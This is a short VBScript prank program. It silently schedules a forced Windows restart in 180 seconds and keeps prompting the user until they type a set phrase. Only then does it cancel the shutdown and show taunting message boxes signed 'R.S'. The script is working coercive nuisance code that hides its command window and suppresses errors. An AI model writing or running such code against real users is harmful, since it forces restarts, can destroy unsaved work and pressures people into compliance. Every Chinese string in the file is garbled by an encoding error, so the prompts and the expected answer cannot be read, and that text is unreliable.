on error resume next
dim WSHshellA
set WSHshellA = wscript.createobject("wscript.shell")
WSHshellA.run "cmd.exe /c shutdown -r -t 180 -c ""�ҽ�ʲô����֪������180��ػ������ţ����ԡ�����"" ",0 ,true
dim a
do while(a <> "��ˬ")
a = inputbox ("˵������,�Ͳ��ػ����죬˵��","˵��˵","��˵",7000,8000)
msgbox chr(13) + chr(13) + chr(13) + a,5000,"MsgBox"
loop
msgbox chr(13) + chr(13) + chr(13) + "���˵������"
dim WSHshell
set WSHshell = wscript.createobject("wscript.shell")
WSHshell.run "cmd.exe /c shutdown -a",0 ,true
msgbox chr(13) + chr(13) + chr(13) + "R.S"
msgbox chr(13) + chr(13) + chr(13) + "��ס��,�������ͬѧ!"
msgbox chr(13) + chr(13) + chr(13) + "֪������ʲô��ô?"
msgbox chr(13) + chr(13) + chr(13) + "��ǧ�������Ŷ!"
msgbox chr(13) + chr(13) + chr(13) + "֪������˭ô?"
msgbox chr(13) + chr(13) + chr(13) + "��ס�ˣ�"
msgbox chr(13) + chr(13) + chr(13) + "��ס��ô?~~~"
msgbox chr(13) + chr(13) + chr(13) + "R.S!"
msgbox chr(13) + chr(13) + chr(13) + "R.S!"
msgbox chr(13) + chr(13) + chr(13) + "88,!"